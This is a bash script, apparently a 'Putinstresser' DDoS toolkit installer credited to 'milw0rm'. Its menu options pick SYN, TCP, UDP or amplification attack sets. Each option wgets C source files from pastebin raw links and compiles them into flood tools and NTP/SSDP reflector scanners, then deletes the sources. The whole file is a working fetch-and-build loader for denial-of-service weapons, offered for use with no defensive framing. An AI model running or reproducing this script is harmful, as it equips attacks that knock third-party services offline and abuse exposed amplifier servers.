#!/bin/bash
 
 #--------------------------#
# Download Putinstresser.eu v1#
 #         By milw0rm.       #
  #------------------------#
 
if [ $# != 1 ]; then
echo "-Putin Attack Source Downloader And Compiler-"
echo "Option 1: sh $0 -all / Downloads All Attack Scripts"
echo "Option 2: sh $0 -syn / Downloads All syn Based Attack Scripts"
echo "Option 3: sh $0 -tcp / Downloads All tcp Based Attack Scripts"
echo "Option 4: sh $0 -udp / Downloads All udp Based Attack Scripts"
echo "Option 5: sh $0 -amp / Downloads All amp Based Attack Scripts and Scanners"
echo "Option Help: sh $0 -h"
exit 0
fi
 
while test $# -gt 0; do
        case "$1" in
                -all|-a)
                                echo "Downloading All Attack Sources With Amp Sources"
                                wget -q https://pastebin.com/raw/NwML59s9 -O flood.c
                                gcc -o flood flood.c
                                wget -q https://pastebin.com/raw/c1JhexCa -O essyn.c
                                gcc -pthread essyn.c -o essyn
                                wget -q https://pastebin.com/raw/YUYG8J0H -O rssyn.c
                                gcc -pthread rssyn.c -o rssyn.c
                                wget -q https://pastebin.com/raw/5Nm9zA2c -O xsyn.c
                                gcc -pthread xsyn.c -o xsyn
                                wget -q https://pastebin.com/raw/6bG6Zxam -O syn.c
                                gcc -pthread syn.c -o syn
                                wget -q https://pastebin.com/raw/BuNVxPk2 -O dominate.c
                                gcc -pthread dominate.c -o dominate
                                wget -q https://pastebin.com/raw/mb1wUd8g -O ack.c
                                gcc -pthread ack.c -o ack
                                wget -q https://pastebin.com/raw/P6BeNUqk -O sack.c
                                gcc -pthread sack.c -o sack
                                wget -q https://pastebin.com/raw/FqLfy2hg -O zap.c
                                gcc -pthread zap.c -o zap
                                wget -q https://pastebin.com/raw/PgBV1RVF -O xack.c
                                gcc -pthread xack.c -o xack
                                wget -q https://pastebin.com/raw/hgjgXcjJ -O std.c
                                gcc -o std std.c
                                wget -q https://pastebin.com/raw/2iJ3ESBi -O rawudp.c
                                gcc -pthread rawudp.c -o rawudp
                                wget -q https://pastebin.com/raw/cHKJW7g2 -O vse.c
                                gcc -pthread vse.c -o vse
                                wget -q https://pastebin.com/raw/UP5crmZ1 -O telnet.c
                                gcc -pthread telnet.c -o telnet
                                wget -q https://pastebin.com/raw/CrXHvNw0 -O ntp.c
                                gcc -pthread ntp.c -o ntp
                                wget -q https://pastebin.com/raw/ztY4hMh1 -O ntp_scanner.c
                                gcc -pthread ntp_scanner.c -o ntp_scanner
                                wget -q https://pastebin.com/raw/r2z67WD5 -O ssdp.c
                                gcc -pthread ssdp.c -o ssdp
                                wget -q https://pastebin.com/raw/i15hAcZG -O ssdp_scanner.c
                                gcc -pthread ssdp_scanner.c -o ssdp_scanner
                                rm -rf *.c
                                exit 0
                        ;;
                -syn|-s)
                                echo "Downloading All syn Based Attack Sources"
                                wget -q https://pastebin.com/raw/c1JhexCa -O essyn.c
                                gcc -pthread essyn.c -o essyn
                                wget -q https://pastebin.com/raw/YUYG8J0H -O rssyn.c
                                gcc -pthread rssyn.c -o rssyn.c
                                wget -q https://pastebin.com/raw/5Nm9zA2c -O xsyn.c
                                gcc -pthread xsyn.c -o xsyn
                                wget -q https://pastebin.com/raw/6bG6Zxam -O syn.c
                                gcc -pthread syn.c -o syn
                                wget -q https://pastebin.com/raw/NwML59s9 -O flood.c
                                gcc -o flood flood.c
                                rm -rf *.c
                                exit 0
                        ;;
                                -tcp|-t)
                                echo "Downloading All tcp Based Attack Sources"
                                wget -q https://pastebin.com/raw/BuNVxPk2 -O dominate.c
                                gcc -pthread dominate.c -o dominate
                                wget -q https://pastebin.com/raw/mb1wUd8g -O ack.c
                                gcc -pthread ack.c -o ack
                                wget -q https://pastebin.com/raw/P6BeNUqk -O sack.c
                                gcc -pthread sack.c -o sack
                                wget -q https://pastebin.com/raw/FqLfy2hg -O zap.c
                                gcc -pthread zap.c -o zap
                                wget -q https://pastebin.com/raw/PgBV1RVF -O xack.c
                                gcc -pthread xack.c -o xack
                                wget -q https://pastebin.com/raw/NwML59s9 -O flood.c
                                gcc -o flood flood.c
                                rm -rf *.c
                                exit 0
                                                ;;
                                -udp|-u)
                                echo "Downloading All udp Based Attack Sources"
                                wget -q https://pastebin.com/raw/hgjgXcjJ -O std.c
                                gcc -o std std.c
                                wget -q https://pastebin.com/raw/2iJ3ESBi -O rawudp.c
                                gcc -pthread rawudp.c -o rawudp
                                wget -q https://pastebin.com/raw/cHKJW7g2 -O vse.c
                                gcc -pthread vse.c -o vse
                                wget -q https://pastebin.com/raw/UP5crmZ1 -O telnet.c
                                gcc -pthread telnet.c -o telnet
                                wget -q https://pastebin.com/raw/NwML59s9 -O flood.c
                                gcc -o flood flood.c
                                rm -rf *.c
                                exit 0
                                                ;;
                                -amp|-A)
                                echo "Downloading All amp Based Attack Sources And Scanner Sources"
                                wget -q https://pastebin.com/raw/CrXHvNw0 -O ntp.c
                                gcc -pthread ntp.c -o ntp
                                wget -q https://pastebin.com/raw/ztY4hMh1 -O ntp_scanner.c
                                gcc -pthread ntp_scanner.c -o ntp_scanner
                                wget -q https://pastebin.com/raw/r2z67WD5 -O ssdp.c
                                gcc -pthread ssdp.c -o ssdp
                                wget -q https://pastebin.com/raw/i15hAcZG -O ssdp_scanner.c
                                gcc -pthread ssdp_scanner.c -o ssdp_scanner
                                rm -rf *.c
                                exit 0
                                                ;;
                                -h|--help)
                                        echo "-Putin Attack Source Downloader And Compiler-"
                                        echo "Option -all Downloads All Attack Scripts"
                                        echo "Option -syn Downloads All syn Based Attack Scripts"
                                        echo "Option -tcp Downloads All tcp Based Attack Scripts"
                                        echo "Option -udp Downloads All udp Based Attack Scripts"
                                        echo "Option -amp Downloads All amp Based Attack Scripts and Scanners"
                                        exit 0
                                                ;;
                *)
                                        echo "Invalid Option. Exiting."
                    exit 0
                        ;;
        esac
done
